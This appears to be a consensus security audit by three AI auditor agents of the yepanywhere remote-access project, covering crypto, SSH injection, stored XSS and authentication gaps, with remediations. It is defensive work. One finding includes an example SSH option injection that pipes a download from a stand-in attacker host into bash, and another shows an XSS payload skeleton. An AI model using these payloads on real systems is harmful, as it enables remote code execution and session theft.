# Security Audit: yepanywhere
## 3-Agent Consensus Report

**Date:** 2026-02-05
**Commit:** d5ed2d28ad4e50724429b68b42390db96282f9cd
**Auditors:** Crypto Specialist (Agent 1), AppSec Engineer (Agent 2), Network Analyst (Agent 3)

---

## Executive Summary

| Severity | Count | Confirmed (2+ Agents) | Single-Agent |
|----------|-------|-----------------------|--------------|
| CRITICAL | 1     | 0                     | 1            |
| HIGH     | 7     | 3                     | 4            |
| MEDIUM   | 12    | 3                     | 9            |
| LOW      | 10    | 1                     | 9            |

**Overall Assessment:** CONDITIONAL PASS

The cryptographic core (SRP-6a + NaCl secretbox) is implemented correctly using well-vetted libraries with proper parameters. End-to-end encryption provides meaningful protection against relay compromise. However, several significant issues surround the crypto core: unauthenticated network binding, SSH command injection vectors, unsanitized HTML rendering, missing brute-force protection, and session key storage concerns. These must be addressed before production deployment in untrusted network environments.

**Key Findings:**
1. **[CRITICAL]** Binding to `0.0.0.0` without authentication exposes full Claude Code control to the LAN
2. **[HIGH]** SSH command injection via user-controlled `host` parameter in remote executor configuration
3. **[HIGH]** Stored XSS via unsanitized `marked` → `dangerouslySetInnerHTML` pipeline
4. **[HIGH]** No rate limiting on SRP authentication allows brute-force password attacks
5. **[HIGH]** Session resume proof is replayable within a 5-minute window

---

## Consensus Matrix

| Finding | Agent 1 | Agent 2 | Agent 3 | Consensus | Final Severity |
|---------|---------|---------|---------|-----------|----------------|
| Session keys stored plaintext on disk | 1.3 (MED) | — | 3.4 (HIGH) | 2/3 CONFIRMED | HIGH |
| Session resume proof replay (5min) | 1.5 (MED) | — | 3.10 (HIGH) | 2/3 CONFIRMED | HIGH |
| No rate limiting on authentication | — | 2.5 (MED) | 3.3 (HIGH) | 2/3 CONFIRMED | HIGH |
| WebSocket null/missing origin bypass | — | 2.10 (MED) | 3.8 (MED) | 2/3 CONFIRMED | MEDIUM |
| Relay CORS origin: "*" | — | 2.13 (LOW) | 3.11 (LOW) | 2/3 CONFIRMED | LOW |
| Maintenance server weak access controls | — | 2.4 (HIGH) | 3.14 (LOW) | 2/3 CONFIRMED | HIGH |
| Session keys in localStorage (XSS risk) | 1.4 (MED) | — | 3.4 (MED) | 2/3 CONFIRMED | MEDIUM |
| 0.0.0.0 binding without mandatory auth | — | — | 3.9 (CRIT) | 1/3 VERIFIED | CRITICAL |
| SSH injection via session-sync host | — | 2.1 (HIGH) | — | 1/3 VERIFIED | HIGH |
| SSH injection via remote-spawn host | — | 2.2 (HIGH) | — | 1/3 VERIFIED | HIGH |
| Stored XSS via markdown rendering | — | 2.3 (HIGH) | — | 1/3 VERIFIED | HIGH |
| Relay server no TLS enforcement | — | — | 3.1 (HIGH) | 1/3 VERIFIED | MEDIUM |
| Upload path traversal | — | 2.12 (MED) | — | 1/3 VERIFIED | MEDIUM |
| No NaCl message replay protection | 1.2 (LOW) | — | 3.6 (MED) | 2/3 CONFIRMED | MEDIUM |
| No perfect forward secrecy | 1.2 (LOW) | — | 3.15 (MED) | 2/3 CONFIRMED | MEDIUM |
| User enumeration via /online endpoint | — | 2.13 (LOW) | 3.2 (MED) | 2/3 CONFIRMED | MEDIUM |
| Debug routes session manipulation | — | 2.8 (MED) | — | 1/3 VERIFIED | MEDIUM |
| Content-Disposition header injection | — | 2.6 (MED) | — | 1/3 VERIFIED | MEDIUM |
| readJsonBody no size limit (DoS) | — | 2.7 (MED) | 3.13 (LOW) | 2/3 CONFIRMED | MEDIUM |
| Key derivation lacks domain separation | 1.2 (LOW) | — | — | 1/3 VERIFIED | LOW |
| No key zeroing after use | 1.6 (LOW) | — | — | 1/3 NOTED | LOW |
| Password retained in memory | 1.7 (LOW) | — | — | 1/3 NOTED | LOW |
| Misleading SHA-256 comment | 1.1 (LOW) | — | — | 1/3 NOTED | LOW |
| tssrp6a omits identity from verifier | 1.8 (LOW) | — | 3.12 (MED) | 2/3 CONFIRMED | LOW |
| CORS allows all Tailscale domains | — | 2.9 (LOW) | — | 1/3 NOTED | LOW |
| Cookie secure flag on localhost | — | 2.14 (LOW) | — | 1/3 NOTED | LOW |
| Information disclosure in errors | — | 2.11 (LOW) | — | 1/3 NOTED | LOW |
| installId fingerprinting by relay | — | — | 3.16 (LOW) | 1/3 NOTED | LOW |
| Relay unauthenticated client pairing | — | — | 3.5 (MED) | 1/3 VERIFIED | LOW |
| Relay traffic analysis metadata | — | — | 3.7 (MED) | 1/3 NOTED | LOW |

---

## Confirmed Findings (2+ Agents)

### CF-1: Session Keys Stored in Plaintext on Disk [HIGH]
**Found by:** Agent 1 (1.3), Agent 3 (3.4)

- **Files:** `packages/server/src/remote-access/RemoteSessionService.ts:163-165, 271`
- **Description:** The 32-byte NaCl secretbox session key is stored as base64 in `remote-sessions.json` without encryption at rest. No explicit file permissions are set. Anyone who reads this file can decrypt all relay traffic for active sessions and craft valid session resume proofs.
- **Deep Dive:** Verified. `JSON.stringify(this.state, null, 2)` writes the full state including `sessionKey` to disk via `fs.writeFile` with default permissions. The SRP verifier in `remote-access.json` is similarly exposed.
- **Remediation:**
  1. Set file permissions to `0600` on both `remote-sessions.json` and `remote-access.json`
  2. Consider encrypting session keys at rest using a master key
  3. Reduce default session lifetime from 30 days

### CF-2: Session Resume Proof Replayable Within 5-Minute Window [HIGH]
**Found by:** Agent 1 (1.5), Agent 3 (3.10)

- **Files:** `packages/server/src/remote-access/RemoteSessionService.ts:211-249`, `packages/client/src/lib/connection/SecureConnection.ts:344-352`
- **Description:** Session resume uses an encrypted timestamp validated within a 5-minute window (`MAX_PROOF_AGE_MS = 5 * 60 * 1000`). There is no server-side nonce tracking or challenge-response. A malicious relay operator who captures a resume proof can replay it within the window to hijack the session.
- **Deep Dive:** Verified. Each proof uses a unique NaCl nonce, so the server cannot detect replays by comparing ciphertexts. The encrypted envelope `{ nonce, ciphertext }` is fully replayable.
- **Remediation:**
  1. Add a server-generated random challenge to the resume protocol
  2. Client must include the challenge in the encrypted proof
  3. Alternatively, track used proof nonces server-side and reject duplicates

### CF-3: No Rate Limiting on SRP/Password Authentication [HIGH]
**Found by:** Agent 2 (2.5), Agent 3 (3.3)

- **Files:** `packages/server/src/auth/routes.ts:198-230`, `packages/server/src/routes/ws-relay-handlers.ts:1026-1177`
- **Description:** Neither the HTTP login endpoint nor the WebSocket SRP authentication has rate limiting. An attacker can perform unlimited brute-force attempts. After a failed SRP proof, the WebSocket connection remains open for retry. Minimum password length is only 6 characters (HTTP) / 8 characters (SRP).
- **Deep Dive:** Verified. No `rateLimit`, `throttle`, or brute-force protection exists anywhere in the codebase.
- **Remediation:**
  1. Implement per-IP rate limiting on login endpoint (e.g., 5 attempts/minute)
  2. Close WebSocket after failed SRP authentication attempt
  3. Add exponential backoff after consecutive failures
  4. Increase minimum password length to 12+ characters

### CF-4: WebSocket Origin Validation Accepts Null/Missing Origins [MEDIUM]
**Found by:** Agent 2 (2.10), Agent 3 (3.8)

- **Files:** `packages/server/src/routes/ws-relay.ts:99-105`
- **Code:** `if (!origin || origin === "null") return true;`
- **Description:** Missing or `null` origins are treated as trusted. Non-browser clients can connect without sending Origin headers. `file://` URLs and sandboxed iframes also send `null` origin. Additionally, `*.github.io` is in the allowed patterns, enabling any GitHub Pages site to connect.
- **Deep Dive:** Verified. When remote access is disabled (local mode), connections without origin are immediately set to `authenticated` at line 204-207 without any auth check.
- **Remediation:**
  1. Do not accept `null` origin unless explicitly needed
  2. Restrict `*.github.io` to the specific project deployment domain
  3. Require authentication even for local WebSocket connections when bound to non-localhost

### CF-5: Maintenance Server Inspector/Reload With Weak Access Controls [HIGH]
**Found by:** Agent 2 (2.4), Agent 3 (3.14)

- **Files:** `packages/server/src/maintenance/server.ts:464-509`
- **Description:** The maintenance server protects against cross-origin browser requests but accepts any request without Origin header (curl, local processes). The `inspector.open()` accepts a user-controlled `host` parameter that could be set to `0.0.0.0`, exposing the Node.js debugger to the network. `/reload` triggers `process.exit(0)` for DoS. Chrome DevTools inspector provides arbitrary code execution within the Node.js process.
- **Deep Dive:** Verified. The origin check at lines 100-131 only blocks requests WITH a cross-origin `Origin` header. Any request without Origin passes through. The `host` parameter for inspector at line 482 is user-controlled.
- **Remediation:**
  1. Validate inspector `host` parameter against an allowlist (`127.0.0.1` only)
  2. Add shared-secret authentication to sensitive endpoints (`/inspector/open`, `/reload`)
  3. Ensure maintenance server can never be bound to non-localhost interfaces

### CF-6: No NaCl Message Replay Protection [MEDIUM]
**Found by:** Agent 1 (1.2, implicit), Agent 3 (3.6)

- **Files:** `packages/server/src/crypto/nacl-wrapper.ts`, `packages/client/src/lib/connection/nacl-wrapper.ts`
- **Description:** NaCl secretbox provides authenticated encryption but no replay detection. A malicious relay operator who captures encrypted request messages can replay them. Replayed requests would be processed as new requests (e.g., approve a tool use twice).
- **Remediation:** Add monotonic sequence numbers to encrypted messages. Both sides track expected sequence and reject out-of-order or replayed messages.

### CF-7: Session Keys in localStorage (XSS Exposure) [MEDIUM]
**Found by:** Agent 1 (1.4), Agent 3 (3.4, mentioned)

- **Files:** `packages/client/src/lib/connection/SecureConnection.ts:898-910`
- **Description:** Session key stored as base64 in browser `localStorage`. Accessible to any JavaScript on the same origin, vulnerable to XSS. Combined with the XSS finding (see SF-3), this creates a viable attack chain.
- **Remediation:** Consider `sessionStorage` (cleared on tab close) or storing only a session identifier.

### CF-8: Relay Server CORS Allows All Origins [LOW]
**Found by:** Agent 2 (2.13), Agent 3 (3.11)

- **Files:** `packages/relay/src/server.ts:125-132`
- **Code:** `cors({ origin: "*" })`
- **Description:** Relay HTTP endpoints (including `/online/:username` and `/status`) are accessible from any website.
- **Remediation:** Restrict CORS to specific deployment domains.

### CF-9: User Enumeration via /online Endpoint [MEDIUM]
**Found by:** Agent 2 (2.13, implicit), Agent 3 (3.2)

- **Files:** `packages/relay/src/server.ts:157-161`
- **Description:** `GET /online/:username` returns `{ online: true/false }` without authentication or rate limiting. Enables presence tracking and targeted attacks.
- **Remediation:** Add rate limiting. Consider requiring authentication or removing the endpoint.

### CF-10: Unbounded Request Body on Maintenance Server [MEDIUM]
**Found by:** Agent 2 (2.7), Agent 3 (3.13, related)

- **Files:** `packages/server/src/maintenance/server.ts:232-246`
- **Description:** `readJsonBody` accumulates chunks without size limit. An attacker can send an extremely large body to cause OOM.
- **Remediation:** Add a maximum body size check (e.g., 1MB).

### CF-11: No Perfect Forward Secrecy [MEDIUM]
**Found by:** Agent 1 (1.2, implicit), Agent 3 (3.15)

- **Description:** Session keys derived from SRP are reused across reconnections for up to 30 days. If compromised, all past messages in that session are decryptable.
- **Remediation:** Implement periodic key rotation within active sessions.

### CF-12: SRP Verifier Enables Offline Dictionary Attack [LOW]
**Found by:** Agent 1 (1.8), Agent 3 (3.12)

- **Files:** `packages/server/src/remote-access/RemoteAccessService.ts:30-38`
- **Description:** `remote-access.json` stores SRP salt and verifier. SRP's key derivation is not as slow as bcrypt/argon2, making offline attacks more feasible for weak passwords. The tssrp6a library also omits identity from verifier computation.
- **Remediation:** Use a strong KDF (argon2) before passing password to SRP routines. Restrict file permissions.

---

## Single-Agent Findings (Verified)

### SF-1: Network Binding to 0.0.0.0 Without Mandatory Authentication [CRITICAL]
**Found by:** Agent 3 (3.9) only

- **Files:** `packages/server/src/index.ts:529-610`, `packages/server/src/routes/ws-relay.ts:204-207`
- **Description:** When the server is bound to `0.0.0.0` (via `NetworkBindingService` or `--host` flag), the WebSocket endpoint at `/api/ws` becomes accessible from any device on the network. If remote access (SRP auth) is not enabled, the WebSocket handler sets `connState.authState = "authenticated"` immediately without any authentication check. This gives **unauthenticated access to ALL API functionality** to anyone on the LAN, including starting/stopping Claude Code sessions and viewing all content.
- **Deep Dive Verification:** CONFIRMED. Lines 204-207 of `ws-relay.ts` show: `if (!remoteAccessService?.isEnabled()) { connState.authState = "authenticated"; }`. Cookie auth applies to HTTP but not WebSocket. This is the most severe finding in the audit.
- **Why Other Agents Missed It:** Agent 1 (crypto-focused) didn't examine network binding. Agent 2 (app-sec) focused on the HTTP auth layer and didn't trace the WebSocket auth path for the non-remote-access case.
- **Remediation:**
  1. REQUIRE authentication (SRP or cookie-based) on WebSocket when bound to non-localhost
  2. Display a prominent warning when enabling network binding without authentication
  3. Consider refusing to bind to non-localhost without authentication enabled

### SF-2: SSH Command Injection via Remote Executor Host [HIGH]
**Found by:** Agent 2 (2.1, 2.2) only

- **Files:** `packages/server/src/sdk/session-sync.ts:73-76`, `packages/server/src/sdk/remote-spawn.ts:249-260, 418`
- **Description:** The `host` parameter in SSH commands comes from user-controlled `executor` values set via the API. In `session-sync.ts`, `remotePath` is interpolated into a shell command string (`mkdir -p '${remotePath}'`) sent over SSH without proper escaping. In `remote-spawn.ts`, the `host` argument to SSH could contain SSH option injection like `-oProxyCommand=...`. The settings route (`settings.ts:81-83`) only validates that executors are non-empty strings.
- **Deep Dive Verification:** CONFIRMED. `settings.ts:81` validates only `typeof e === "string" && e.trim().length > 0`. No hostname format validation. In `session-sync.ts:75`, `remotePath` includes `projectDir` which could contain shell metacharacters. In `remote-spawn.ts`, the `host` is passed directly as an SSH argument.
- **Why Other Agents Missed It:** Agent 1 (crypto-only scope). Agent 3 (network/protocol focus, not application-level injection).
- **Remediation:**
  1. Validate `host` against strict pattern: `/^[a-zA-Z0-9._@:-]+$/` at the API boundary
  2. Use `--` before host argument in SSH: `["ssh", "--", host, command]`
  3. Apply `escapeShell()` to `remotePath` in `session-sync.ts`

### SF-3: Stored XSS via Unsanitized Markdown Rendering [HIGH]
**Found by:** Agent 2 (2.3) only

- **Files:** `packages/server/src/augments/augment-generator.ts:215`, `packages/server/src/augments/read-augments.ts:64`, `packages/client/src/components/blocks/TextBlock.tsx:101`, `packages/client/src/hooks/useStreamingMarkdown.ts:126`
- **Description:** `marked.parse()` is called without any sanitization configuration. Output HTML is inserted into the DOM via `dangerouslySetInnerHTML` and direct `.innerHTML` assignment across 20+ locations. If a file read by Claude contains malicious markdown (e.g., `<img src=x onerror="...">`), it will execute in the browser. The session key in localStorage (CF-7) becomes exfiltrable.
- **Deep Dive Verification:** CONFIRMED. `marked` is imported and used with no sanitization options (no `sanitize`, no `sanitizer`, no DOMPurify). The `renderInlineFormatting` function in augment-generator.ts does call `escapeHtml` for inline content, but `renderMarkdownBlock` at line 215 does not.
- **Why Other Agents Missed It:** Agent 1 (crypto-only). Agent 3 (network/protocol focus, not client-side rendering).
- **Remediation:**
  1. Add DOMPurify on the client side before all `innerHTML`/`dangerouslySetInnerHTML` usage
  2. Or configure a custom `marked` renderer that sanitizes HTML
  3. Strip event handler attributes (`onerror`, `onload`, etc.) and dangerous tags (`<script>`, `<iframe>`)

### SF-4: Relay Server Has No TLS [MEDIUM]
**Found by:** Agent 3 (3.1) only

- **Files:** `packages/relay/src/index.ts:90`, `packages/relay/src/server.ts:168`
- **Description:** The relay server creates a plain `node:http` server with no TLS. It's intended to run behind a reverse proxy, but nothing enforces this. `RemoteAccessService` accepts both `ws://` and `wss://` URLs equally. Without TLS, the registration protocol (usernames, installIds) travels in cleartext.
- **Deep Dive Verification:** CONFIRMED. Only `createServer` from `node:http` is used. No TLS code exists in the relay package.
- **Downgraded from HIGH to MEDIUM:** The E2E encryption (NaCl secretbox) protects application data even without TLS. The relay is designed to run behind a TLS-terminating reverse proxy. The exposure is metadata (usernames, installIds) and the intended deployment model mitigates the concern.
- **Remediation:**
  1. Enforce `wss://` only in `RemoteAccessService.setRelayConfig()`
  2. Document that relay MUST be deployed behind TLS-terminating reverse proxy
  3. Consider adding native TLS support as fallback

### SF-5: Upload Path Traversal via encodedProjectPath [MEDIUM]
**Found by:** Agent 2 (2.12) only

- **Files:** `packages/server/src/uploads/manager.ts:85-93`
- **Code:** `const dir = join(uploadsDir, encodedProjectPath, sessionId);`
- **Description:** `getUploadDir` joins user-controlled `encodedProjectPath` into a path without verifying the result stays within `uploadsDir`. If `encodedProjectPath` contains `../` sequences, directories could be created outside the uploads directory.
- **Deep Dive Verification:** CONFIRMED. The function does not validate that the resolved path is within `uploadsDir`.
- **Remediation:** After computing `dir`, verify `dir.startsWith(uploadsDir)`. Validate that `encodedProjectPath` contains no path separators or `..`.

### SF-6: Debug Routes Allow Session Manipulation [MEDIUM]
**Found by:** Agent 2 (2.8) only

- **Files:** `packages/server/src/maintenance/debug-routes.ts`
- **Description:** Debug routes on the maintenance server expose create/send/terminate session capabilities. Protected only by the maintenance server's origin check (which accepts all non-browser clients).
- **Remediation:** Add authentication. Disable in production or require explicit `--debug` flag.

### SF-7: Content-Disposition Header Injection [MEDIUM]
**Found by:** Agent 2 (2.6) only

- **Files:** `packages/server/src/routes/files.ts:484`
- **Description:** Filename from user input inserted into `Content-Disposition` header without sanitization. Could enable header injection.
- **Remediation:** Sanitize filename, remove control characters, use RFC 5987 encoding.

---

## Disputed/Resolved

### Maintenance Server Severity Disagreement
- **Agent 2 rated HIGH**, citing inspector host injection and reload DoS
- **Agent 3 rated LOW**, noting localhost-only binding
- **Resolution:** HIGH. While localhost-only limits network exposure, the inspector `host` parameter can be set to `0.0.0.0` (verified at line 482), and any local process can trigger these endpoints. The combination of arbitrary host binding for the inspector + arbitrary code execution via DevTools makes this HIGH.

### Relay No TLS Severity
- **Agent 3 rated HIGH**
- **Resolution:** Downgraded to MEDIUM. The E2E encryption layer means application data is protected regardless of TLS. The relay is designed to run behind a reverse proxy. The metadata exposure (usernames, installIds) is the actual risk, which is medium severity.

### SRP Verifier / Offline Attack Severity
- **Agent 3 rated MEDIUM**, Agent 1 rated LOW (different framing - identity omission)
- **Resolution:** LOW. Single-user deployment model reduces the identity omission concern. The verifier is equivalent in strength to a bcrypt hash of the password. File permission hardening (CF-1) is the proper fix.

---

## Crypto Implementation Assessment

| Component | Status | Notes |
|-----------|--------|-------|
| SRP-6a Parameters | ✓ | 2048-bit RFC 5054 prime, g=2, SHA-512, k=H(N,g) |
| SRP-6a Protocol | ✓ | Proper A!=0, B!=0 checks, mutual verification (M1, M2) |
| NaCl Secretbox | ✓ | XSalsa20-Poly1305, correct key/nonce sizes |
| Nonce Generation | ✓ | 24 bytes, cryptographically random, never reused |
| Auth Failure Handling | ✓ | Null return properly checked in all decrypt paths |
| Key Derivation | ✓* | SHA-512(S)[0:32] works but lacks domain separation (HKDF preferred) |
| Key Storage | ✗ | Plaintext on disk and in localStorage |
| Key Zeroing | ✗ | References nulled but bytes not zeroed |
| Replay Protection | ✗ | No sequence numbers or replay detection |
| Forward Secrecy | ✗ | Same key reused for up to 30 days |

---

## Architecture Security

```
                    ┌──────────────────────────────────────────────┐
                    │              TRUST BOUNDARY                   │
                    │                                              │
┌──────────┐       │  ┌───────────┐    SRP+NaCl    ┌──────────┐  │
│  Browser  │◄─────┼──┤   Relay   │◄──────────────►│  Server  │  │
│ (Client)  │  WS  │  │  (Dumb    │    E2E enc     │  (Hono)  │  │
│           │      │  │   Pipe)   │                 │          │  │
└──────────┘       │  └───────────┘                 └────┬─────┘  │
     │             │       │                              │       │
     │             │       │ Sees: usernames,             │       │
     │             │       │ installIds, timing,          │       │
     │             │       │ message sizes                │       │
     │             │       │                              │       │
     │             │       │ Cannot see: message          ▼       │
     │             │       │ content (encrypted)    ┌──────────┐  │
     │             │       │                        │ Claude   │  │
     │             └───────┼────────────────────────┤ CLI/SDK  │  │
     │                     │                        └──────────┘  │
     │                     │                                      │
     ▼                     ▼                                      │
┌──────────┐       ┌───────────┐       ┌────────────────────┐    │
│localStorage│     │Relay SQLite│      │remote-sessions.json│    │
│sessionKey │      │username/id│       │  plaintext keys    │    │
│(XSS risk) │      │(metadata) │       │  (file perm risk)  │    │
└──────────┘       └───────────┘       └────────────────────┘    │
                                                                  │
                    ┌──────────────────────────────────────────────┘
                    │ ATTACK SURFACES:
                    │ • 0.0.0.0 binding without auth (CRITICAL)
                    │ • SSH command injection via executor (HIGH)
                    │ • XSS via unsanitized markdown (HIGH)
                    │ • Brute-force SRP (no rate limit) (HIGH)
                    │ • Session resume replay (5min) (HIGH)
                    └──────────────────────────────────────────────
```

---

## Recommendations (Priority Order)

### P0 — CRITICAL (Fix Immediately)

1. **Require authentication when binding to non-localhost interfaces.**
   When `0.0.0.0` or non-`127.0.0.1` binding is requested, either require SRP remote access to be enabled or enforce cookie authentication on the WebSocket endpoint. Do not silently set `authState = "authenticated"` for non-localhost connections.
   - File: `packages/server/src/routes/ws-relay.ts:204-207`

### P1 — HIGH (Fix Before Production Use)

2. **Validate SSH executor hostnames** against a strict pattern (`/^[a-zA-Z0-9._@:-]+$/`) at the API boundary. Prefix SSH host arguments with `--` to prevent option injection. Apply `escapeShell()` to all interpolated paths in SSH command strings.
   - Files: `packages/server/src/routes/settings.ts:81`, `packages/server/src/sdk/session-sync.ts:75`, `packages/server/src/sdk/remote-spawn.ts:249`

3. **Sanitize all markdown-to-HTML output** using DOMPurify before inserting into the DOM. Add a custom marked renderer or post-processing step that strips event handlers and dangerous tags.
   - Files: `packages/server/src/augments/augment-generator.ts:215`, `packages/client/src/hooks/useStreamingMarkdown.ts`, all `dangerouslySetInnerHTML` usages

4. **Implement rate limiting on authentication** — both HTTP login and WebSocket SRP. Close WebSocket after failed auth attempt. Add per-IP exponential backoff.
   - Files: `packages/server/src/auth/routes.ts`, `packages/server/src/routes/ws-relay-handlers.ts`

5. **Add challenge-response to session resume.** Server generates random challenge, client includes it in encrypted proof. Prevents replay attacks.
   - Files: `packages/server/src/remote-access/RemoteSessionService.ts`, `packages/client/src/lib/connection/SecureConnection.ts`

6. **Restrict file permissions** on `remote-sessions.json` and `remote-access.json` to `0600`.
   - File: `packages/server/src/remote-access/RemoteSessionService.ts:271`

7. **Validate inspector host parameter** against allowlist (`127.0.0.1` only). Add authentication to sensitive maintenance endpoints.
   - File: `packages/server/src/maintenance/server.ts:482`

### P2 — MEDIUM (Fix in Next Release)

8. **Add path traversal protection to upload directory resolution.** Verify resolved path stays within uploadsDir.
   - File: `packages/server/src/uploads/manager.ts:90`

9. **Remove or restrict `/online/:username` endpoint.** Add rate limiting at minimum.
   - File: `packages/relay/src/server.ts:157-161`

10. **Add request body size limits to maintenance server.**
    - File: `packages/server/src/maintenance/server.ts:232-246`

11. **Enforce `wss://` for relay URLs.** Reject `ws://` in RemoteAccessService configuration.
    - File: `packages/server/src/remote-access/RemoteAccessService.ts`

12. **Restrict WebSocket origin validation.** Remove `null` origin exception. Restrict GitHub Pages pattern to specific deployment domain.
    - File: `packages/server/src/routes/ws-relay.ts:99-105`

13. **Sanitize Content-Disposition headers.** Strip control characters from filenames.
    - File: `packages/server/src/routes/files.ts:484`

14. **Add authentication to debug routes** or disable in production.
    - File: `packages/server/src/maintenance/debug-routes.ts`

15. **Add message replay protection.** Implement monotonic sequence numbers in the encrypted message protocol.

### P3 — LOW (Consider for Hardening)

16. Use HKDF with domain separation labels for key derivation instead of raw `SHA-512(S)[0:32]`.
17. Zero key material before dereferencing (`Uint8Array.fill(0)`).
18. Clear password from memory after successful SRP handshake.
19. Fix misleading SHA-256 comment (library uses SHA-512).
20. Implement periodic key rotation for long-lived sessions.
21. Use hashed installId for relay registration to prevent fingerprinting.
22. Restrict CORS on relay to specific deployment domains.
23. Use `sessionStorage` instead of `localStorage` for session keys.
24. Consider subclassing SRP routines to include identity in verifier computation.
25. Add generic error messages in production (remove internal details from error responses).

---

## Appendix: Agent Raw Findings

### Agent 1 Raw Output (Cryptography Specialist)

#### Finding 1.1: Misleading Comment — Says SHA-256 but Library Uses SHA-512
- **File:** `packages/server/src/crypto/srp-server.ts:15-16`, `packages/client/src/lib/connection/srp-client.ts:15-16`
- **Code:** `/** SRP parameters: 2048-bit prime group with SHA-256 */ const SRP_PARAMS = new SRPParameters();`
- **Issue:** Comment says SHA-256 but `new SRPParameters()` defaults to SHA-512. Misleading documentation, not a vulnerability.
- **Severity:** LOW

#### Finding 1.2: Session Key Derivation Lacks Domain Separation
- **File:** `packages/server/src/crypto/nacl-wrapper.ts:92-94`, `packages/client/src/lib/connection/nacl-wrapper.ts:119-121`
- **Code:** `return nacl.hash(srpSessionKey).slice(0, KEY_LENGTH);`
- **Issue:** KDF is `SHA-512(S)[0..31]` with no domain separator, salt, or context label. Same key used bidirectionally.
- **Severity:** LOW (safe in practice due to NaCl's 192-bit nonce space)

#### Finding 1.3: Session Keys Stored in Plaintext on Server Disk
- **File:** `packages/server/src/remote-access/RemoteSessionService.ts:163-165, 271`
- **Issue:** 32-byte secretbox key stored as base64 in `remote-sessions.json` without encryption at rest.
- **Severity:** MEDIUM

#### Finding 1.4: Session Keys Stored in localStorage on Client
- **File:** `packages/client/src/lib/connection/SecureConnection.ts:898-910`
- **Issue:** Session key in `localStorage` accessible to any JavaScript on same origin (XSS risk).
- **Severity:** MEDIUM

#### Finding 1.5: Session Resume Proof Vulnerable to Replay Within 5-Minute Window
- **File:** `packages/server/src/remote-access/RemoteSessionService.ts:211-249`, `packages/client/src/lib/connection/SecureConnection.ts:344-352`
- **Issue:** Encrypted timestamp with 5-minute window, no nonce tracking or challenge-response. Replayable.
- **Severity:** MEDIUM

#### Finding 1.6: No Key Zeroing After Use
- **File:** `packages/client/src/lib/connection/SecureConnection.ts:1606-1607`
- **Issue:** `this.sessionKey = null` without `.fill(0)` first. Defense-in-depth concern.
- **Severity:** LOW

#### Finding 1.7: Password Retained in Memory After SRP Handshake
- **File:** `packages/client/src/lib/connection/SecureConnection.ts:134`
- **Issue:** Plaintext password persists in `this.password` for entire SecureConnection lifetime.
- **Severity:** LOW

#### Finding 1.8: tssrp6a Library Omits Identity from Verifier Computation
- **Issue:** `x = H(salt || password)` instead of `x = H(salt || H(identity || ":" || password))`. Library limitation.
- **Severity:** LOW (single-user system)

#### Positive Findings (Agent 1)
- Nonces: 24 bytes, cryptographically random, never reused ✓
- `nacl.secretbox` used correctly (XSalsa20-Poly1305) ✓
- Key sizes: 32 bytes validated in every encrypt/decrypt function ✓
- Auth failure: `null` return properly checked in all decrypt paths ✓
- No custom crypto implementations ✓
- SRP-6a: 2048-bit RFC 5054 prime, g=2, k=H(N,g), A≠0, B≠0, mutual verification ✓
- Salt: random, sufficient length ✓
- Verifier stored, password never persisted ✓
- Session expiration: 7-day idle, 30-day max, hourly cleanup ✓
- Binary envelope: version byte authenticated inside AEAD ciphertext ✓

---

### Agent 2 Raw Output (Application Security Engineer)

#### Finding 2.1: SSH Command Injection via `host` Parameter in Session Sync [HIGH]
- **File:** `packages/server/src/sdk/session-sync.ts:73-76`
- **Code:** `spawn("ssh", ["-o", "BatchMode=yes", host, \`mkdir -p '${remotePath}'\`])`
- **Attack:** `remotePath` includes `projectDir` which can contain shell metacharacters. Single-quote wrapping can be broken.

#### Finding 2.2: SSH Command Injection via `host` Parameter in Remote Spawn [HIGH]
- **File:** `packages/server/src/sdk/remote-spawn.ts:249-260`
- **Attack:** `host` could be `-oProxyCommand=curl attacker.com/payload|bash` — SSH interprets it as options.

#### Finding 2.3: Stored XSS via Unsanitized Markdown Rendering [HIGH]
- **Files:** `packages/server/src/augments/augment-generator.ts:215`, `packages/client/src/components/blocks/TextBlock.tsx:101`
- **Attack:** `marked.parse()` without sanitization → `dangerouslySetInnerHTML`. Malicious markdown from file reads executes in browser.

#### Finding 2.4: Maintenance Server Inspector/Reload Weak Access Controls [HIGH]
- **File:** `packages/server/src/maintenance/server.ts:464-509`
- **Attack:** Inspector `host` can be set to `0.0.0.0`. Any local process can trigger without auth.

#### Finding 2.5: No Rate Limiting on Authentication Endpoints [MEDIUM]
- **File:** `packages/server/src/auth/routes.ts:198-230`
- **Attack:** Unlimited brute-force attempts on login endpoint.

#### Finding 2.6: Content-Disposition Header Injection [MEDIUM]
- **File:** `packages/server/src/routes/files.ts:484`
- **Attack:** Filename with `"` or newlines could inject headers.

#### Finding 2.7: Maintenance Server readJsonBody No Size Limit [MEDIUM]
- **File:** `packages/server/src/maintenance/server.ts:232-246`
- **Attack:** Unlimited body size causes OOM.

#### Finding 2.8: Debug Routes Allow Session Manipulation [MEDIUM]
- **File:** `packages/server/src/maintenance/debug-routes.ts`
- **Attack:** Create/send/terminate sessions from any local process.

#### Finding 2.9: CORS Allows All Tailscale Domains [LOW]
- **File:** `packages/server/src/middleware/security.ts:5-10`
- **Attack:** Any `.ts.net` machine can make cross-origin requests.

#### Finding 2.10: WebSocket Origin Validation Allows Null Origin [MEDIUM]
- **File:** `packages/server/src/routes/ws-relay.ts:99-105`
- **Attack:** `null` origin from `file://` URLs accepted. `*.github.io` in allow list.

#### Finding 2.11: Information Disclosure in Error Responses [LOW]
- **File:** `packages/server/src/maintenance/server.ts:187-192`
- **Attack:** Internal error messages exposed to clients.

#### Finding 2.12: Upload Path Traversal via encodedProjectPath [MEDIUM]
- **File:** `packages/server/src/uploads/manager.ts:85-93`
- **Attack:** `../` in encodedProjectPath creates directories outside uploadsDir.

#### Finding 2.13: Relay Server CORS Set to Allow All Origins [LOW]
- **File:** `packages/relay/src/server.ts:125-132`
- **Attack:** Any website can query relay status/online endpoints.

#### Finding 2.14: Cookie Security Missing Secure Flag for Localhost [LOW]
- **File:** `packages/server/src/auth/routes.ts:183-189`
- **Issue:** `secure: true` may not work on HTTP localhost in older browsers.

#### Positive Findings (Agent 2)
- `resolveFilePath()` properly prevents path traversal for file serving ✓
- Upload filenames sanitized with UUID prefixes ✓
- SRP properly implemented for remote access ✓
- `SRP_AUTHENTICATED` Symbol cannot be forged externally ✓
- bcrypt with 12 rounds for password hashing ✓
- Session IDs use 32 bytes of cryptographic randomness ✓
- `spawnSync` for API key uses argument arrays ✓
- `escapeShell()` exists and is used for env vars and args ✓

---

### Agent 3 Raw Output (Network & Protocol Analyst)

#### Finding 3.1: Relay Server Has No TLS [HIGH]
- **Component:** `packages/relay/src/index.ts:90`, `packages/relay/src/server.ts:168`
